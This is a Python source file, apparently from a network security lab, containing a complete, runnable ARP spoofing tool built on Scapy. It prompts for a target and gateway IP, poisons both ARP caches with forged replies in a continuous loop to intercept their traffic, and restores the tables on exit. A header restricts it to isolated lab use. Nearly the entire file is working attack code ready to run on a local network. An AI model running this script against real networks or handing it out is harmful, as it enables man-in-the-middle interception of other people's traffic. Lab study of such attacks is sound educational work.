#!/usr/bin/env python3
"""
arp_attack.py  –  ARP Spoofing Demo Script (run on Kali Linux)
===============================================================
PURPOSE : Poison the ARP cache of a target machine by continuously
          sending forged ARP replies, making the target believe the
          attacker's MAC is associated with the gateway IP.

USAGE   : sudo python3 arp_attack.py
          (prompts for target IP and gateway IP interactively)

LEGAL   : Use ONLY in your own isolated lab environment.
          Unauthorised use on real networks is illegal.

FIXES applied vs original:
  1. Moved 'import os' to module level (was buried inside main())
  2. Guard restore_arp() call so it only runs when MACs were resolved
     (prevents TypeError / crash if Ctrl+C pressed before MAC lookup)
"""

import sys
import os               # FIX 1: moved from inside main() to module level
import time
import signal

# ── Dependency check ────────────────────────────────────────────
try:
    from scapy.all import (
        Ether, ARP, sendp, get_if_hwaddr,
        conf, srp, get_if_list
    )
except ImportError:
    print("[!] Scapy not found. Install with:  pip install scapy")
    sys.exit(1)

# ── Globals ─────────────────────────────────────────────────────
RUNNING = True


def signal_handler(sig, frame):
    global RUNNING
    print("\n\n[!] Stopping attack and restoring ARP tables ...")
    RUNNING = False


signal.signal(signal.SIGINT, signal_handler)


# ────────────────────────────────────────────────────────────────
#  Helpers
# ────────────────────────────────────────────────────────────────

def get_mac(ip: str, iface: str) -> str:
    """
    Resolve the real MAC address of an IP via a genuine ARP request.
    Returns MAC string or None if unreachable.
    """
    arp_req  = ARP(pdst=ip)
    ether    = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet   = ether / arp_req
    answered, _ = srp(packet, iface=iface, timeout=2, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    return None


def forge_arp_reply(target_ip: str, target_mac: str, spoof_ip: str) -> Ether:
    """
    Build a forged ARP reply that tells *target* the MAC for *spoof_ip*
    is the attacker's own MAC.
    """
    return (
        Ether(dst=target_mac) /
        ARP(
            op=2,               # op=2 → ARP reply
            pdst=target_ip,     # who we're poisoning
            hwdst=target_mac,   # their real MAC (so they accept it)
            psrc=spoof_ip,      # IP we're pretending to own (gateway)
            # hwsrc defaults to attacker's own MAC automatically
        )
    )


def restore_arp(
    target_ip:   str,
    target_mac:  str,
    gateway_ip:  str,
    gateway_mac: str,
    iface:       str,
    count:       int = 5,
) -> None:
    """
    Send legitimate ARP replies to restore correct mappings on both
    the victim and the gateway after the attack stops.
    """
    # Tell target: gateway's IP → gateway's real MAC
    pkt1 = (
        Ether(dst=target_mac) /
        ARP(op=2, pdst=target_ip, hwdst=target_mac,
            psrc=gateway_ip, hwsrc=gateway_mac)
    )
    # Tell gateway: target's IP → target's real MAC
    pkt2 = (
        Ether(dst=gateway_mac) /
        ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
            psrc=target_ip, hwsrc=target_mac)
    )
    sendp(pkt1, iface=iface, count=count, verbose=False)
    sendp(pkt2, iface=iface, count=count, verbose=False)
    print("[*] ARP tables restored.")


# ────────────────────────────────────────────────────────────────
#  Main
# ────────────────────────────────────────────────────────────────

def main():
    if os.geteuid() != 0:
        print("[!] Run as root:  sudo python3 arp_attack.py")
        sys.exit(1)

    print("=" * 55)
    print("    ARP Spoofing Demo  –  NetShield Lab (Kali)")
    print("=" * 55)

    # ── Auto-pick interface ──────────────────────────────────────
    iface = str(conf.iface)
    print(f"[*] Detected interface : {iface}")

    # ── User input ───────────────────────────────────────────────
    target_ip  = input("\n[?] Enter TARGET IP  (Ubuntu/victim)  : ").strip()
    gateway_ip = input("[?] Enter GATEWAY IP (router)          : ").strip()
    interval   = float(input("[?] Packet interval in seconds (0.5)   : ").strip() or "0.5")

    print("\n[*] Resolving MACs …")
    target_mac  = get_mac(target_ip,  iface)
    gateway_mac = get_mac(gateway_ip, iface)

    if not target_mac:
        print(f"[!] Cannot resolve MAC for {target_ip}. Is it online?")
        sys.exit(1)
    if not gateway_mac:
        print(f"[!] Cannot resolve MAC for {gateway_ip}. Is it online?")
        sys.exit(1)

    attacker_mac = get_if_hwaddr(iface)

    print(f"\n  Target  : {target_ip}  ({target_mac})")
    print(f"  Gateway : {gateway_ip}  ({gateway_mac})")
    print(f"  Attacker: {attacker_mac}  (our MAC)")
    print(f"  Interval: {interval}s\n")
    print("[*] Poisoning ARP cache … [Ctrl+C to stop]\n")

    # ── Forged packets (built once, reused) ─────────────────────
    #   Packet A → tells TARGET   : "gateway IP is at attacker MAC"
    #   Packet B → tells GATEWAY  : "target IP  is at attacker MAC"
    pkt_a = forge_arp_reply(target_ip,  target_mac,  gateway_ip)
    pkt_b = forge_arp_reply(gateway_ip, gateway_mac, target_ip)

    sent = 0
    while RUNNING:
        sendp(pkt_a, iface=iface, verbose=False)
        sendp(pkt_b, iface=iface, verbose=False)
        sent += 2
        print(f"\r[*] Packets sent: {sent}  (poisoning {target_ip} ↔ {gateway_ip})", end="")
        time.sleep(interval)

    # ── Cleanup ──────────────────────────────────────────────────
    # FIX 2: guard so restore_arp is only called when MACs were
    #         successfully resolved (prevents TypeError on early Ctrl+C)
    if target_mac and gateway_mac:
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface)
    else:
        print("[*] Nothing to restore (MAC lookup not completed).")

    print(f"\n[+] Done. Total forged packets sent: {sent}")


if __name__ == "__main__":
    main()
